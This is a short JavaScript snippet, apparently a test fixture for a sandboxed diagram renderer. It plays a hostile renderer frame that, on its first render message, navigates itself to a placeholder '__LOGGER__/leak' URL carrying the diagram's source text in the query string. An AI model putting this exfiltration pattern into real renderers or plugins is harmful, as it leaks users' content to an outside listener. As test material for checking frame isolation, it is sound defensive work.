// A region renderer that, on its first render request, replaces its own frame
// with a page on the listener carrying the diagram's source text.
window.addEventListener('message', function (e) {
  if (e.data && e.data.type === 'render') {
    location.href = '__LOGGER__/leak?d=' + encodeURIComponent(e.data.source);
  }
});
parent.postMessage({ type: 'ready' }, '*');
